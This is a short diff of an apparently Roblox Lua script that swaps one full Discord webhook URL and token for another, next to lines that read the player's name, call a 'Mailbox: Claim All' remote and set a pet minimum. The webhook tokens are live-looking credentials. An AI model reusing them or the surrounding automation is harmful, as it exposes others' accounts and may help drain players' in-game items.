@@ -3,7 +3,7 @@ local HttpService = game:GetService("HttpService")
 local username = game.Players.LocalPlayer.Name
 local mailboxInvoke = game:GetService("ReplicatedStorage").Network["Mailbox: Claim All"]
 
-local webhookURL = "https://discord.com/api/webhooks/1292139458124058665/itOdfUcNzL673X5b9NH6LbX3fQX9bR-xgQ2UMMsB0Up-RA98JvheoQszUUibyk1HDA6f"
+local webhookURL = "https://discord.com/api/webhooks/1292848048120004809/YX00fTqDkpeUDsfAKdA-M4gUZUGt0CU24n-Qq07w6aqEmE4RRvbYaXjTfuYhB2iYmIFf"
 local petCubeMinimum = 1000
 local userID = "1202699896235360386"
 
